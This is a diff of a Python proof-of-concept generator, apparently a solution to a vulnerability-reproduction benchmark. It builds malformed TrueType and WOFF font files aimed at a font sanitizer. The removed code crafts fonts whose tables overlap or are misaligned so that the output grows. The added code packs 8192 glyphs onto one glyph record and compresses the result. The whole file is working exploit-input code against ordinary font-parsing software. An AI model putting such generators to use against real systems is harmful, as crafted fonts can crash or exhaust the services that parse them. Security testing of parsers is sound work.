@@ -1,102 +1,135 @@
-import os
-import re
+import struct
+import zlib
 import tarfile
-from typing import Dict, List, Tuple, Optional
+from typing import Dict, Tuple, List
 
 
-def _be16(x: int) -> bytes:
-    return int(x & 0xFFFF).to_bytes(2, "big", signed=False)
+def _u16(v: int) -> bytes:
+    return struct.pack(">H", v & 0xFFFF)
 
 
-def _bes16(x: int) -> bytes:
-    return int(x).to_bytes(2, "big", signed=True)
+def _i16(v: int) -> bytes:
+    return struct.pack(">h", int(v))
 
 
-def _be32(x: int) -> bytes:
-    return int(x & 0xFFFFFFFF).to_bytes(4, "big", signed=False)
+def _u32(v: int) -> bytes:
+    return struct.pack(">I", v & 0xFFFFFFFF)
 
 
-def _be64(x: int) -> bytes:
-    return int(x & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "big", signed=False)
+def _tag(t: str) -> bytes:
+    b = t.encode("ascii", "strict")
+    if len(b) != 4:
+        raise ValueError("Tag must be 4 bytes")
+    return b
 
 
-def _align4(n: int) -> int:
-    return (n + 3) & ~3
+def _pad4(b: bytes) -> bytes:
+    r = (-len(b)) & 3
+    if r:
+        return b + (b"\x00" * r)
+    return b
 
 
-def _checksum32(data: bytes) -> int:
-    padded = data + b"\0" * ((4 - (len(data) & 3)) & 3)
+def _checksum(data: bytes) -> int:
+    d = _pad4(data)
     s = 0
-    for i in range(0, len(padded), 4):
-        s = (s + int.from_bytes(padded[i:i + 4], "big")) & 0xFFFFFFFF
+    for i in range(0, len(d), 4):
+        s = (s + struct.unpack(">I", d[i:i + 4])[0]) & 0xFFFFFFFF
     return s
 
 
 def _sfnt_params(num_tables: int) -> Tuple[int, int, int]:
-    # searchRange, entrySelector, rangeShift
-    max_pow = 1
+    max_power2 = 1
     entry_selector = 0
-    while (max_pow << 1) <= num_tables:
-        max_pow <<= 1
+    while (max_power2 << 1) <= num_tables:
+        max_power2 <<= 1
         entry_selector += 1
-    search_range = max_pow * 16
+    search_range = max_power2 * 16
     range_shift = num_tables * 16 - search_range
     return search_range, entry_selector, range_shift
 
 
-def _build_head(index_to_loc_format: int = 0, check_sum_adjustment: int = 0) -> bytes:
-    # head table: 54 bytes
-    version = 0x00010000
-    font_revision = 0x00010000
-    magic = 0x5F0F3CF5
-    flags = 0
-    units_per_em = 1000
-    created = 0
-    modified = 0
-    x_min = 0
-    y_min = 0
-    x_max = 0
-    y_max = 0
-    mac_style = 0
-    lowest_rec_ppem = 8
-    font_direction_hint = 2
-    glyph_data_format = 0
+def _build_sfnt(tables: Dict[str, bytes]) -> Tuple[bytes, Dict[str, Tuple[int, int, int]]]:
+    tags = sorted(tables.keys())
+    num_tables = len(tags)
+    search_range, entry_selector, range_shift = _sfnt_params(num_tables)
 
-    b = bytearray()
-    b += _be32(version)
-    b += _be32(font_revision)
-    b += _be32(check_sum_adjustment)
-    b += _be32(magic)
-    b += _be16(flags)
-    b += _be16(units_per_em)
-    b += _be64(created)
-    b += _be64(modified)
-    b += _bes16(x_min)
-    b += _bes16(y_min)
-    b += _bes16(x_max)
-    b += _bes16(y_max)
-    b += _be16(mac_style)
-    b += _be16(lowest_rec_ppem)
-    b += _bes16(font_direction_hint)
-    b += _bes16(index_to_loc_format)
-    b += _bes16(glyph_data_format)
-    assert len(b) == 54
-    return bytes(b)
+    offset_table = _u32(0x00010000) + _u16(num_tables) + _u16(search_range) + _u16(entry_selector) + _u16(range_shift)
+
+    dir_entries = []
+    table_data_parts = []
+    current_offset = 12 + 16 * num_tables
+    current_offset = (current_offset + 3) & ~3
+
+    records: Dict[str, Tuple[int, int, int]] = {}
+    for t in tags:
+        data = tables[t]
+        length = len(data)
+        csum = _checksum(data)
+        dir_entries.append(_tag(t) + _u32(csum) + _u32(current_offset) + _u32(length))
+        table_data_parts.append(_pad4(data))
+        records[t] = (csum, current_offset, length)
+        current_offset += len(_pad4(data))
+
+    sfnt = offset_table + b"".join(dir_entries) + b"".join(table_data_parts)
+    return sfnt, records
 
 
-def _build_maxp(num_glyphs: int = 2) -> bytes:
-    # maxp v1.0: 32 bytes
-    version = 0x00010000
-    b = bytearray()
-    b += _be32(version)
-    b += _be16(num_glyphs)
-    # remaining 13 uint16 fields
+def _build_head(index_to_loc_format: int) -> bytes:
+    # 'head' table (54 bytes)
+    # version, fontRevision, checkSumAdjustment, magicNumber, flags, unitsPerEm,
+    # created, modified, xMin, yMin, xMax, yMax, macStyle, lowestRecPPEM,
+    # fontDirectionHint, indexToLocFormat, glyphDataFormat
+    return (
+        _u32(0x00010000) +            # version
+        _u32(0x00010000) +            # fontRevision
+        _u32(0) +                     # checkSumAdjustment (patched later)
+        _u32(0x5F0F3CF5) +            # magicNumber
+        _u16(0x0003) +                # flags
+        _u16(1024) +                  # unitsPerEm
+        (_u32(0) + _u32(0)) +         # created
+        (_u32(0) + _u32(0)) +         # modified
+        _i16(0) + _i16(0) + _i16(0) + _i16(0) +  # bbox
+        _u16(0) +                     # macStyle
+        _u16(8) +                     # lowestRecPPEM
+        _i16(2) +                     # fontDirectionHint
+        _i16(index_to_loc_format) +   # indexToLocFormat
+        _i16(0)                       # glyphDataFormat
+    )
+
+
+def _build_hhea(num_hmetrics: int, advance_width_max: int = 512) -> bytes:
+    # 'hhea' table (36 bytes)
+    ascent = 800
+    descent = -200
+    line_gap = 0
+    return (
+        _u32(0x00010000) +        # version
+        _i16(ascent) +            # ascent
+        _i16(descent) +           # descent
+        _i16(line_gap) +          # lineGap
+        _u16(advance_width_max) + # advanceWidthMax
+        _i16(0) +                 # minLeftSideBearing
+        _i16(0) +                 # minRightSideBearing
+        _i16(0) +                 # xMaxExtent
+        _i16(1) +                 # caretSlopeRise
+        _i16(0) +                 # caretSlopeRun
+        _i16(0) +                 # caretOffset
+        _i16(0) + _i16(0) + _i16(0) + _i16(0) +  # reserved
+        _i16(0) +                 # metricDataFormat
+        _u16(num_hmetrics)        # numberOfHMetrics
+    )
+
+
+def _build_maxp(num_glyphs: int) -> bytes:
+    # 'maxp' version 1.0 (32 bytes): version, numGlyphs, 13 uint16 fields
+    max_zones = 2
     fields = [
         0,  # maxPoints
         0,  # maxContours
         0,  # maxCompositePoints
         0,  # maxCompositeContours
-        2,  # maxZones
+        max_zones,  # maxZones
         0,  # maxTwilightPoints
         0,  # maxStorage
         0,  # maxFunctionDefs
@@ -106,404 +139,279 @@ def _build_maxp(num_glyphs: int = 2) -> bytes:
         0,  # maxComponentElements
         0,  # maxComponentDepth
     ]
-    for v in fields:
-        b += _be16(v)
-    assert len(b) == 32
-    return bytes(b)
+    return _u32(0x00010000) + _u16(num_glyphs) + b"".join(_u16(x) for x in fields)
 
 
-def _build_hhea(num_hmetrics: int = 2) -> bytes:
-    # hhea: 36 bytes
-    major = 1
-    minor = 0
-    ascender = 0
-    descender = 0
-    line_gap = 0
-    advance_width_max = 500
-    min_lsb = 0
-    min_rsb = 0
-    x_max_extent = 500
-    caret_slope_rise = 1
-    caret_slope_run = 0
-    caret_offset = 0
-    metric_data_format = 0
-
-    b = bytearray()
-    b += _be16(major)
-    b += _be16(minor)
-    b += _bes16(ascender)
-    b += _bes16(descender)
-    b += _bes16(line_gap)
-    b += _be16(advance_width_max)
-    b += _bes16(min_lsb)
-    b += _bes16(min_rsb)
-    b += _bes16(x_max_extent)
-    b += _bes16(caret_slope_rise)
-    b += _bes16(caret_slope_run)
-    b += _bes16(caret_offset)
-    b += _bes16(0)  # reserved
-    b += _bes16(0)  # reserved
-    b += _bes16(0)  # reserved
-    b += _bes16(0)  # reserved
-    b += _bes16(metric_data_format)
-    b += _be16(num_hmetrics)
-    assert len(b) == 36
-    return bytes(b)
+def _build_hmtx(num_glyphs: int, advance_width: int = 512, lsb: int = 0) -> bytes:
+    rec = _u16(advance_width) + _i16(lsb)
+    return rec * num_glyphs
 
 
-def _build_hmtx(num_hmetrics: int = 2) -> bytes:
-    # full metrics for each glyph (since numHMetrics == numGlyphs)
-    b = bytearray()
-    for _ in range(num_hmetrics):
-        b += _be16(500)  # advanceWidth
-        b += _bes16(0)   # lsb
-    return bytes(b)
+def _build_loca_short_one_glyph_data(num_glyphs: int, glyph0_length: int) -> bytes:
+    # short format: offsets/2
+    # glyph0 at offset 0..glyph0_length, remaining glyphs length 0
+    if glyph0_length & 1:
+        raise ValueError("glyph0_length must be even for short loca")
+    v0 = 0
+    v_rest = glyph0_length // 2
+    # num_glyphs + 1 entries: [0] + [v_rest]*num_glyphs
+    return _u16(v0) + (_u16(v_rest) * num_glyphs)
 
 
-def _build_glyf_empty_glyph() -> bytes:
-    # Empty simple glyph: numberOfContours=0, bbox all 0
-    return _bes16(0) + _bes16(0) + _bes16(0) + _bes16(0) + _bes16(0)
+def _build_glyf_one_empty_glyph() -> bytes:
+    # Empty simple glyph:
+    # numberOfContours=0, xMin=yMin=xMax=yMax=0, instructionLength=0
+    return _i16(0) + _i16(0) + _i16(0) + _i16(0) + _i16(0) + _u16(0)
 
 
-def _build_glyf(num_glyphs: int = 2) -> bytes:
-    # Two empty glyphs, 10 bytes each
-    return _build_glyf_empty_glyph() * num_glyphs
-
-
-def _build_loca_short(offsets: List[int]) -> bytes:
-    # offsets are byte offsets into glyf; store /2
-    b = bytearray()
-    for off in offsets:
-        b += _be16(off // 2)
-    return bytes(b)
-
-
-def _build_cmap_format4_single(platform_id: int = 3, encoding_id: int = 1, codepoint: int = 0x0041, glyph_id: int = 1) -> bytes:
-    # cmap table with one encoding record using format 4 subtable mapping codepoint -> glyph_id
-    # segCount=2: one segment for codepoint, one sentinel.
+def _build_cmap_format4_single_char(char_code: int, glyph_id: int) -> bytes:
+    # cmap header: version=0, numTables=1, encodingRecord (platform=3, encoding=1, offset=12)
+    # format 4 subtable with 2 segments: [char_code..char_code] and sentinel [0xFFFF..0xFFFF]
     seg_count = 2
     seg_count_x2 = seg_count * 2
     search_range = 2 * (1 << (seg_count.bit_length() - 1))
-    entry_selector = seg_count.bit_length() - 1
+    entry_selector = (seg_count.bit_length() - 1)
     range_shift = seg_count_x2 - search_range
 
-    end_codes = [codepoint, 0xFFFF]
-    start_codes = [codepoint, 0xFFFF]
-    id_delta0 = (glyph_id - codepoint) & 0xFFFF
-    id_deltas = [id_delta0, 1]
-    id_range_offsets = [0, 0]
+    # segment 1 maps char_code -> glyph_id, idRangeOffset=0
+    id_delta1 = (glyph_id - char_code) & 0xFFFF
+    # segment 2 sentinel
+    id_delta2 = 1
 
-    sub = bytearray()
-    sub += _be16(4)   # format
-    sub_len_pos = len(sub)
-    sub += _be16(0)   # length placeholder
-    sub += _be16(0)   # language
-    sub += _be16(seg_count_x2)
-    sub += _be16(search_range)
-    sub += _be16(entry_selector)
-    sub += _be16(range_shift)
-    for v in end_codes:
-        sub += _be16(v)
-    sub += _be16(0)  # reservedPad
-    for v in start_codes:
-        sub += _be16(v)
-    for v in id_deltas:
-        sub += _be16(v)
-    for v in id_range_offsets:
-        sub += _be16(v)
-    sub_len = len(sub)
-    sub[sub_len_pos:sub_len_pos + 2] = _be16(sub_len)
+    end_codes = [_u16(char_code), _u16(0xFFFF)]
+    start_codes = [_u16(char_code), _u16(0xFFFF)]
+    id_deltas = [_u16(id_delta1), _u16(id_delta2)]
+    id_range_offsets = [_u16(0), _u16(0)]
 
-    cmap = bytearray()
-    cmap += _be16(0)  # version
-    cmap += _be16(1)  # numTables
-    cmap += _be16(platform_id)
-    cmap += _be16(encoding_id)
-    cmap += _be32(12)  # offset to subtable (start after header + 1 encoding record)
-    cmap += sub
-    return bytes(cmap)
+    subtable = (
+        _u16(4) +                 # format
+        _u16(32) +                # length
+        _u16(0) +                 # language
+        _u16(seg_count_x2) +
+        _u16(search_range) +
+        _u16(entry_selector) +
+        _u16(range_shift) +
+        b"".join(end_codes) +
+        _u16(0) +                 # reservedPad
+        b"".join(start_codes) +
+        b"".join(id_deltas) +
+        b"".join(id_range_offsets)
+    )
+
+    cmap = (
+        _u16(0) +                 # version
+        _u16(1) +                 # numTables
+        _u16(3) + _u16(1) + _u32(12) +  # encodingRecord
+        subtable
+    )
+    return cmap
 
 
-def _detect_constraints_from_source(src_path: str) -> Tuple[Optional[bool], Optional[bool]]:
-    # Returns (overlap_enforced, offset_align_enforced) or (None,None) if unknown.
-    # Heuristic: scan OTS-related sources for overlap checks and offset alignment checks.
-    overlap_enforced = None
-    align_enforced = None
+def _build_name_minimal() -> bytes:
+    # name table version 0 with one record: Family name "A"
+    # platform=3, encoding=1, language=0x0409, nameID=1
+    s = b"\x00A"  # UTF-16BE "A"
+    count = 1
+    string_offset = 6 + 12 * count
+    rec = _u16(3) + _u16(1) + _u16(0x0409) + _u16(1) + _u16(len(s)) + _u16(0)
+    return _u16(0) + _u16(count) + _u16(string_offset) + rec + s
 
-    def consider_text(t: str) -> None:
-        nonlocal overlap_enforced, align_enforced
-        tl = t.lower()
 
-        if align_enforced is None:
-            # Look for offset alignment checks
-            if re.search(r'offset\s*(?:%|&)\s*(?:4|0x3|3)\s*!=\s*0', tl):
-                align_enforced = True
-            elif "offset % 4" in tl or "offset&3" in tl or "offset & 3" in tl:
-                if "!=" in tl or "== 0" in tl:
-                    align_enforced = True
+def _build_post_v3() -> bytes:
+    return (
+        _u32(0x00030000) +    # version 3.0
+        _u32(0) +             # italicAngle
+        _i16(0) +             # underlinePosition
+        _i16(0) +             # underlineThickness
+        _u32(0) +             # isFixedPitch
+        _u32(0) + _u32(0) + _u32(0) + _u32(0)  # mem usage
+    )
 
-        if overlap_enforced is None:
-            # Look for overlap checks in table directory parsing
-            # e.g., "offset < last_offset + last_length", "overlap", "non-overlapping"
-            if "non-overlap" in tl or "non overlap" in tl or "overlap" in tl:
-                # Avoid setting True solely based on generic mention; require a comparison pattern too.
-                if re.search(r'offset\s*<\s*[^;\n]{0,80}(?:last|prev|prior|end|limit)', tl) or re.search(r'(?:last|prev|prior)[^;\n]{0,50}(?:offset|end)\s*>\s*offset', tl):
-                    overlap_enforced = True
-            if re.search(r'offset\s*<\s*[^;\n]{0,60}(?:last|prev)[^;\n]{0,60}\+\s*[^;\n]{0,60}(?:length|len|size)', tl):
-                overlap_enforced = True
-            if re.search(r'(?:last|prev)[^;\n]{0,60}(?:offset|end)[^;\n]{0,20}\+\s*[^;\n]{0,60}(?:length|len|size)[^;\n]{0,20}>\s*offset', tl):
-                overlap_enforced = True
 
-    try:
-        if os.path.isdir(src_path):
-            for root, _, files in os.walk(src_path):
-                for fn in files:
-                    lfn = fn.lower()
-                    if not (lfn.endswith((".cc", ".cpp", ".c", ".h", ".hpp"))):
-                        continue
-                    full = os.path.join(root, fn)
-                    if "ots" not in full.lower() and "opentype" not in full.lower():
-                        continue
-                    try:
-                        with open(full, "rb") as f:
-                            data = f.read()
-                        consider_text(data.decode("utf-8", errors="ignore"))
-                    except OSError:
-                        pass
+def _build_os2_v0() -> bytes:
+    # OS/2 version 0 (78 bytes)
+    version = 0
+    x_avg_char_width = 512
+    us_weight_class = 400
+    us_width_class = 5
+    fs_type = 0
+    y_subscript_x_size = 650
+    y_subscript_y_size = 699
+    y_subscript_x_offset = 0
+    y_subscript_y_offset = 140
+    y_superscript_x_size = 650
+    y_superscript_y_size = 699
+    y_superscript_x_offset = 0
+    y_superscript_y_offset = 479
+    y_strikeout_size = 49
+    y_strikeout_position = 258
+    s_family_class = 0
+    panose = b"\x00" * 10
+    ul_unicode_range = (_u32(0), _u32(0), _u32(0), _u32(0))
+    ach_vend_id = b"NONE"
+    fs_selection = 0
+    us_first_char_index = 0x0041
+    us_last_char_index = 0x0041
+    s_typo_ascender = 800
+    s_typo_descender = -200
+    s_typo_line_gap = 0
+    us_win_ascent = 800
+    us_win_descent = 200
+
+    return (
+        _u16(version) +
+        _i16(x_avg_char_width) +
+        _u16(us_weight_class) +
+        _u16(us_width_class) +
+        _u16(fs_type) +
+        _i16(y_subscript_x_size) +
+        _i16(y_subscript_y_size) +
+        _i16(y_subscript_x_offset) +
+        _i16(y_subscript_y_offset) +
+        _i16(y_superscript_x_size) +
+        _i16(y_superscript_y_size) +
+        _i16(y_superscript_x_offset) +
+        _i16(y_superscript_y_offset) +
+        _i16(y_strikeout_size) +
+        _i16(y_strikeout_position) +
+        _i16(s_family_class) +
+        panose +
+        b"".join(ul_unicode_range) +
+        ach_vend_id +
+        _u16(fs_selection) +
+        _u16(us_first_char_index) +
+        _u16(us_last_char_index) +
+        _i16(s_typo_ascender) +
+        _i16(s_typo_descender) +
+        _i16(s_typo_line_gap) +
+        _u16(us_win_ascent) +
+        _u16(us_win_descent)
+    )
+
+
+def _build_woff(tables: Dict[str, bytes], flavor: int = 0x00010000) -> bytes:
+    # Compute checkSumAdjustment in head by constructing SFNT first
+    sfnt0, _ = _build_sfnt(tables)
+    total_sum = _checksum(sfnt0)
+    adjustment = (0xB1B0AFBA - total_sum) & 0xFFFFFFFF
+
+    head = bytearray(tables["head"])
+    head[8:12] = _u32(adjustment)
+    tables2 = dict(tables)
+    tables2["head"] = bytes(head)
+
+    sfnt, records = _build_sfnt(tables2)
+    total_sfnt_size = len(sfnt)
+
+    tags = sorted(tables2.keys())
+    num_tables = len(tags)
+
+    header_len = 44
+    dir_len = num_tables * 20
+    data_offset = header_len + dir_len
+    data_offset = (data_offset + 3) & ~3
+
+    dir_entries = []
+    data_blobs: List[bytes] = []
+    curr = data_offset
+
+    for t in tags:
+        data = tables2[t]
+        orig_len = len(data)
+        comp = zlib.compress(data, 9)
+        if len(comp) >= orig_len:
+            comp_data = data
         else:
-            with tarfile.open(src_path, "r:*") as tf:
-                for m in tf.getmembers():
-                    if not m.isfile():
-                        continue
-                    name = m.name.lower()
-                    if not name.endswith((".cc", ".cpp", ".c", ".h", ".hpp")):
-                        continue
-                    if "ots" not in name and "opentype" not in name:
-                        continue
-                    f = tf.extractfile(m)
-                    if f is None:
-                        continue
-                    data = f.read()
-                    consider_text(data.decode("utf-8", errors="ignore"))
+            comp_data = comp
+
+        comp_len = len(comp_data)
+        csum, _, _ = records[t]
+        dir_entries.append(_tag(t) + _u32(curr) + _u32(comp_len) + _u32(orig_len) + _u32(csum))
+        data_blobs.append(_pad4(comp_data))
+        curr += len(_pad4(comp_data))
+
+    woff_len = curr
+    # WOFF header
+    woff_header = (
+        _u32(0x774F4646) +     # signature 'wOFF'
+        _u32(flavor) +
+        _u32(woff_len) +
+        _u16(num_tables) +
+        _u16(0) +              # reserved
+        _u32(total_sfnt_size) +
+        _u16(1) + _u16(0) +    # major/minor version
+        _u32(0) + _u32(0) + _u32(0) +  # metaOffset, metaLength, metaOrigLength
+        _u32(0) + _u32(0)      # privOffset, privLength
+    )
+
+    out = bytearray()
+    out += woff_header
+    out += b"".join(dir_entries)
+    if len(out) < data_offset:
+        out += b"\x00" * (data_offset - len(out))
+    out += b"".join(data_blobs)
+
+    if len(out) != woff_len:
+        out = out[:woff_len] if len(out) > woff_len else out + (b"\x00" * (woff_len - len(out)))
+    return bytes(out)
+
+
+def _supports_woff_in_source(src_path: str) -> bool:
+    try:
+        with tarfile.open(src_path, "r:*") as tf:
+            checked = 0
+            for m in tf:
+                if checked >= 200:
+                    break
+                if not m.isfile():
+                    continue
+                name = (m.name or "").lower()
+                if "woff" in name:
+                    return True
+                if not (name.endswith(".cc") or name.endswith(".c") or name.endswith(".cpp") or name.endswith(".cxx") or
+                        name.endswith(".h") or name.endswith(".hpp") or name.endswith(".hh")):
+                    continue
+                f = tf.extractfile(m)
+                if not f:
+                    continue
+                data = f.read(4096)
+                if b"wOFF" in data or b"WOFF" in data or b"DecodeWOFF" in data or b"WOFFHeader" in data:
+                    return True
+                checked += 1
     except Exception:
-        return None, None
-
-    return overlap_enforced, align_enforced
-
-
-def _build_font_overlap(shared_len: int = 512) -> bytes:
-    # Tables
-    num_glyphs = 2
-    head = bytearray(_build_head(index_to_loc_format=0, check_sum_adjustment=0))
-    maxp = _build_maxp(num_glyphs=num_glyphs)
-    hhea = _build_hhea(num_hmetrics=num_glyphs)
-    hmtx = _build_hmtx(num_hmetrics=num_glyphs)
-    glyf = _build_glyf(num_glyphs=num_glyphs)
-    loca_offsets = [0, 10, 20]
-    loca = _build_loca_short(loca_offsets)
-    cmap = _build_cmap_format4_single(codepoint=0x0041, glyph_id=1)
-
-    if shared_len < 2:
-        shared_len = 2
-    if shared_len & 1:
-        shared_len += 1
-    shared = b"\0" * shared_len
-
-    # Use overlapping offsets for cvt/fpgm/prep
-    tables_unique: Dict[bytes, bytes] = {
-        b"head": bytes(head),
-        b"maxp": maxp,
-        b"hhea": hhea,
-        b"hmtx": hmtx,
-        b"loca": loca,
-        b"glyf": glyf,
-        b"cmap": cmap,
-    }
-    overlap_tables: List[bytes] = [b"cvt ", b"fpgm", b"prep"]
-
-    # Assign offsets
-    tags_all = list(tables_unique.keys()) + overlap_tables
-    num_tables = len(tags_all)
-    search_range, entry_selector, range_shift = _sfnt_params(num_tables)
-
-    header_and_dir_len = 12 + 16 * num_tables
-    data_start = _align4(header_and_dir_len)
-
-    offsets: Dict[bytes, int] = {}
-    lengths: Dict[bytes, int] = {}
-
-    cur = data_start
-    # Place unique tables sequentially
-    for tag in sorted(tables_unique.keys()):
-        offsets[tag] = cur
-        lengths[tag] = len(tables_unique[tag])
-        cur = _align4(cur + len(tables_unique[tag]))
-
-    shared_off = _align4(cur)
-    for tag in overlap_tables:
-        offsets[tag] = shared_off
-        lengths[tag] = len(shared)
-    file_end = shared_off + len(shared)
-
-    # Build file buffer
-    out = bytearray(b"\0" * file_end)
-    # SFNT header (TrueType)
-    out[0:4] = _be32(0x00010000)
-    out[4:6] = _be16(num_tables)
-    out[6:8] = _be16(search_range)
-    out[8:10] = _be16(entry_selector)
-    out[10:12] = _be16(range_shift)
-
-    # Write table data for unique
-    for tag, data in tables_unique.items():
-        off = offsets[tag]
-        out[off:off + len(data)] = data
-    # Write shared blob once
-    out[shared_off:shared_off + len(shared)] = shared
-
-    # Compute checksums for directory (head checksum computed with checkSumAdjustment set to 0 per spec)
-    def table_checksum(tag: bytes) -> int:
-        if tag in overlap_tables:
-            return _checksum32(shared)
-        data = tables_unique[tag]
-        if tag == b"head":
-            tmp = bytearray(data)
-            tmp[8:12] = b"\0\0\0\0"
-            return _checksum32(bytes(tmp))
-        return _checksum32(data)
-
-    # Directory records: sort by offset, then tag for stability (helps if any parser expects sorted by offset)
-    recs = []
-    for tag in tags_all:
-        recs.append((offsets[tag], tag))
-    recs.sort(key=lambda x: (x[0], x[1]))
-
-    dir_pos = 12
-    for _, tag in recs:
-        chksum = table_checksum(tag)
-        out[dir_pos:dir_pos + 4] = tag
-        out[dir_pos + 4:dir_pos + 8] = _be32(chksum)
-        out[dir_pos + 8:dir_pos + 12] = _be32(offsets[tag])
-        out[dir_pos + 12:dir_pos + 16] = _be32(lengths[tag])
-        dir_pos += 16
-
-    # Compute and set checkSumAdjustment in head
-    full_sum = _checksum32(bytes(out))
-    adj = (0xB1B0AFBA - full_sum) & 0xFFFFFFFF
-    head_off = offsets[b"head"]
-    out[head_off + 8:head_off + 12] = _be32(adj)
-
-    return bytes(out)
-
-
-def _build_font_misaligned_no_overlap(extra_unknown_tables: int = 0) -> bytes:
-    # Pack tables back-to-back without 4-byte alignment padding, non-overlapping.
-    # This only helps if the sanitizer outputs 4-aligned tables, increasing size.
-    num_glyphs = 2
-    head = bytearray(_build_head(index_to_loc_format=0, check_sum_adjustment=0))
-    maxp = _build_maxp(num_glyphs=num_glyphs)
-    hhea = _build_hhea(num_hmetrics=num_glyphs)
-    hmtx = _build_hmtx(num_hmetrics=num_glyphs)
-    glyf = _build_glyf(num_glyphs=num_glyphs)
-    loca_offsets = [0, 10, 20]
-    loca = _build_loca_short(loca_offsets)
-    cmap = _build_cmap_format4_single(codepoint=0x0041, glyph_id=1)
-
-    # Make these sizes intentionally awkward to maximize padding in output (if any)
-    cvt = b"\0" * 514  # even
-    fpgm = b"\0" * 513
-    prep = b"\0" * 511
-
-    tables: Dict[bytes, bytes] = {
-        b"head": bytes(head),
-        b"maxp": maxp,
-        b"hhea": hhea,
-        b"hmtx": hmtx,
-        b"loca": loca,
-        b"glyf": glyf,
-        b"cmap": cmap,
-        b"cvt ": cvt,
-        b"fpgm": fpgm,
-        b"prep": prep,
-    }
-
-    # Optional: add a few small unknown tables (only useful if sanitizer preserves unknown tables)
-    for i in range(max(0, extra_unknown_tables)):
-        tag = f"z{i:03d}".encode("ascii")  # 4 bytes for i<1000
-        if len(tag) != 4 or tag in tables:
-            continue
-        tables[tag] = b"A"
-
-    tags_all = list(tables.keys())
-    num_tables = len(tags_all)
-    search_range, entry_selector, range_shift = _sfnt_params(num_tables)
-
-    header_and_dir_len = 12 + 16 * num_tables
-    data_start = header_and_dir_len  # intentionally not aligned
-
-    offsets: Dict[bytes, int] = {}
-    lengths: Dict[bytes, int] = {}
-    cur = data_start
-    # Put in a stable order
-    for tag in sorted(tags_all):
-        offsets[tag] = cur
-        lengths[tag] = len(tables[tag])
-        cur += len(tables[tag])
-
-    file_end = cur
-    out = bytearray(b"\0" * file_end)
-    out[0:4] = _be32(0x00010000)
-    out[4:6] = _be16(num_tables)
-    out[6:8] = _be16(search_range)
-    out[8:10] = _be16(entry_selector)
-    out[10:12] = _be16(range_shift)
-
-    # Write table data
-    for tag, data in tables.items():
-        off = offsets[tag]
-        out[off:off + len(data)] = data
-
-    # Directory records
-    def table_checksum(tag: bytes) -> int:
-        data = tables[tag]
-        if tag == b"head":
-            tmp = bytearray(data)
-            tmp[8:12] = b"\0\0\0\0"
-            return _checksum32(bytes(tmp))
-        return _checksum32(data)
-
-    recs = []
-    for tag in tags_all:
-        recs.append((offsets[tag], tag))
-    recs.sort(key=lambda x: (x[0], x[1]))
-
-    dir_pos = 12
-    for _, tag in recs:
-        out[dir_pos:dir_pos + 4] = tag
-        out[dir_pos + 4:dir_pos + 8] = _be32(table_checksum(tag))
-        out[dir_pos + 8:dir_pos + 12] = _be32(offsets[tag])
-        out[dir_pos + 12:dir_pos + 16] = _be32(lengths[tag])
-        dir_pos += 16
-
-    full_sum = _checksum32(bytes(out))
-    adj = (0xB1B0AFBA - full_sum) & 0xFFFFFFFF
-    head_off = offsets[b"head"]
-    out[head_off + 8:head_off + 12] = _be32(adj)
-
-    return bytes(out)
+        return True
+    return False
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        overlap_enforced, align_enforced = _detect_constraints_from_source(src_path)
+        num_glyphs = 8192
+        index_to_loc_format = 0  # short
+        glyph0 = _build_glyf_one_empty_glyph()
+        glyf = glyph0
+        loca = _build_loca_short_one_glyph_data(num_glyphs, len(glyph0))
 
-        # Prefer overlap amplification when overlap checks appear absent or unknown.
-        if overlap_enforced is not True:
-            return _build_font_overlap(shared_len=512)
+        tables: Dict[str, bytes] = {
+            "head": _build_head(index_to_loc_format),
+            "hhea": _build_hhea(num_glyphs, advance_width_max=512),
+            "maxp": _build_maxp(num_glyphs),
+            "hmtx": _build_hmtx(num_glyphs, advance_width=512, lsb=0),
+            "loca": loca,
+            "glyf": glyf,
+            "cmap": _build_cmap_format4_single_char(0x0041, 0),  # map 'A' to glyph 0
+            "name": _build_name_minimal(),
+            "post": _build_post_v3(),
+            "OS/2": _build_os2_v0(),
+        }
 
-        # If overlap seems enforced, try misaligned non-overlapping layout (if alignment isn't enforced or unknown).
-        if align_enforced is not True:
-            return _build_font_misaligned_no_overlap(extra_unknown_tables=0)
+        if _supports_woff_in_source(src_path):
+            return _build_woff(tables, flavor=0x00010000)
 
-        # Last resort: overlap anyway (most likely intended trigger for stream growth).
-        return _build_font_overlap(shared_len=512)
+        # Fallback: return SFNT directly (still includes correct checkSumAdjustment)
+        sfnt0, _ = _build_sfnt(tables)
+        adjustment = (0xB1B0AFBA - _checksum(sfnt0)) & 0xFFFFFFFF
+        head = bytearray(tables["head"])
+        head[8:12] = _u32(adjustment)
+        tables["head"] = bytes(head)
+        sfnt, _ = _build_sfnt(tables)
+        return sfnt
